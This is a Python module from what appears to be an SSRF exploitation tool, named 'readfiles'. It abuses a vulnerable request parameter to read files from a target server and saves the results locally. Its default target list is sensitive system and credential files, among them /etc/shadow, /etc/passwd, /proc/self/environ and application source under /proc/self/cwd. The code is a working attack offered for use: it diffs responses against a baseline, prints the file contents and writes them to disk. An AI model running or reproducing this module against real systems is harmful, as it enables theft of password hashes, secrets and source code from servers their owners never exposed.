from core.utils import *
import logging
import os

name          = "readfiles"
description   = "Read files from the target"
author        = "Swissky"
documentation = []

class exploit():
    
    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        self.files = args.targetfiles.split(',') if args.targetfiles != None else [
            "/etc/passwd", 
            "/etc/lsb-release", 
            "/etc/shadow", 
            "/etc/hosts", 
            "\/\/etc/passwd", 
            "/proc/self/environ", 
            "/proc/self/cmdline", 
            "/proc/self/cwd/index.php", 
            "/proc/self/cwd/application.py", 
            "/proc/self/cwd/main.py", 
            "/proc/self/exe"
        ]   
        self.file_magic = {'elf' : bytes([0x7f, 0x45, 0x4c, 0x46])}
        
        r = requester.do_request(args.param, "")
        
        if r is not None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            # Replace : with _ for window folder name safe
            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
            directory =  directory.replace(':','_')
            if not os.path.exists(directory):
                os.makedirs(directory)

            for f in self.files:
                r  = requester.do_request(args.param, wrapper_file(f))
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {f}")
                    if bytes(diff, encoding='utf-8').startswith(self.file_magic["elf"]):
                        logging.info("ELF binary found - not printing to stdout")
                    else:
                        logging.info(diff)

                    # Write diff to a file
                    filename = f.replace('\\','_').replace('/','_')
                    logging.info(f"\033[32mWriting file\033[0m : {f} to {directory + '/' + filename}")
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)

        else:
            logging.info("Empty response")
